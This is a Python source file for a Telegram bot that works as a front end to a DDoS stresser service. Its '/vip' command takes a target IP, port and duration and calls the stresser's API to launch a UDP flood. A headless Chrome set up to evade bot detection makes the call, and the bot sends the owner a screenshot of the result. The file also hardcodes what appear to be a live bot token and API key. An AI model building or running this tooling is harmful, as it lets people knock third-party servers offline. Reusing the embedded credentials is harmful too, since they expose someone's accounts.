import telebot
import time
import threading
import os
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.chrome.service import Service
from flask import Flask, request
import requests

BOT_TOKEN = "8473566885:AAEMFq8_3dMlfLlAJbjvNzQ6UYDGmktoF-g"
API_KEY = "ujiYT1DJIAacgnFB"
OWNER_ID = 7459756974

authorized_users = set()

bot = telebot.TeleBot(BOT_TOKEN)
bot.remove_webhook()

# Chrome options
chrome_options = Options()
chrome_options.add_argument('--headless=new')
chrome_options.add_argument('--no-sandbox')
chrome_options.add_argument('--disable-dev-shm-usage')
chrome_options.add_argument('--disable-gpu')
chrome_options.add_argument('--disable-blink-features=AutomationControlled')
chrome_options.add_argument('--user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36')

driver = None

def init_driver():
    global driver
    if driver is None:
        service = Service()
        driver = webdriver.Chrome(service=service, options=chrome_options)
    return driver

def take_screenshot(url):
    driver = init_driver()
    driver.get(url)
    time.sleep(10)
    screenshot_path = f"screenshot_{int(time.time())}.png"
    driver.save_screenshot(screenshot_path)
    return screenshot_path

@bot.message_handler(commands=['start'])
def start(message):
    if message.from_user.id == OWNER_ID:
        bot.reply_to(message, "✅ Bot started!\n\nCommands:\n/vip <ip> <port> <time>\n/add <user_id>\n/remove <user_id>\n/status")
    else:
        bot.reply_to(message, "❌ Unauthorized. Contact @owner")

@bot.message_handler(commands=['add'])
def add_user(message):
    if message.from_user.id != OWNER_ID:
        bot.reply_to(message, "❌ Only owner can add users.")
        return
    try:
        user_id = int(message.text.split()[1])
        authorized_users.add(user_id)
        bot.reply_to(message, f"✅ User {user_id} added!")
    except:
        bot.reply_to(message, "Usage: /add <user_id>")

@bot.message_handler(commands=['remove'])
def remove_user(message):
    if message.from_user.id != OWNER_ID:
        bot.reply_to(message, "❌ Only owner can remove users.")
        return
    try:
        user_id = int(message.text.split()[1])
        authorized_users.discard(user_id)
        bot.reply_to(message, f"✅ User {user_id} removed!")
    except:
        bot.reply_to(message, "Usage: /remove <user_id>")

@bot.message_handler(commands=['vip'])
def vip_attack(message):
    if message.from_user.id not in authorized_users and message.from_user.id != OWNER_ID:
        bot.reply_to(message, "❌ You are not authorized. Contact owner.")
        return
    
    try:
        args = message.text.split()
        if len(args) != 4:
            bot.reply_to(message, "⚠️ Usage: /vip <ip> <port> <time>\nMinimum time: 60 seconds")
            return
        
        _, ip, port, time_val = args
        time_val = int(time_val)
        
        if time_val < 60:
            bot.reply_to(message, "❌ Minimum time is 60 seconds!")
            return
        
        bot.reply_to(message, f"⚡ VIP Started!\n\n🎯 Target: {ip}:{port}\n⏱️ Time: {time_val}s")
        
        url = f"https://susstresser.com/panel/api/api.php?key={API_KEY}&host={ip}&port={port}&time={time_val}&method=udp"
        
        def capture_and_send():
            try:
                screenshot_path = take_screenshot(url)
                with open(screenshot_path, 'rb') as photo:
                    bot.send_photo(OWNER_ID, photo, caption=f"📸 Attack by {message.from_user.id}\n🎯 {ip}:{port}\n⏱️ {time_val}s")
                os.remove(screenshot_path)
            except Exception as e:
                bot.send_message(OWNER_ID, f"❌ Screenshot failed: {str(e)}")
        
        threading.Thread(target=capture_and_send).start()
        
    except Exception as e:
        bot.reply_to(message, f"❌ Error: {str(e)}")

@bot.message_handler(commands=['status'])
def status(message):
    bot.reply_to(message, "🟢 Bot is running!\n✅ Chrome ready\n✅ Cloudflare bypass active")

# Flask app with webhook
app = Flask(__name__)

@app.route('/webhook', methods=['POST'])
def webhook():
    if request.headers.get('content-type') == 'application/json':
        json_string = request.get_data().decode('utf-8')
        update = telebot.types.Update.de_json(json_string)
        bot.process_new_updates([update])
        return 'OK', 200
    return 'Bad Request', 400

@app.route('/')
def home():
    return "Bot is running!"

# Set webhook on startup
def set_webhook():
    heroku_app_name = "vipxofficial-ddos-test-865cf9407a27"
    webhook_url = f"https://{heroku_app_name}.herokuapp.com/webhook"
    
    # Remove old webhook and set new one
    bot.remove_webhook()
    time.sleep(1)
    webhook_response = bot.set_webhook(url=webhook_url)
    
    if webhook_response:
        print(f"✅ Webhook set successfully: {webhook_url}")
    else:
        print(f"❌ Webhook setup failed")

if __name__ == "__main__":
    set_webhook()
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port)
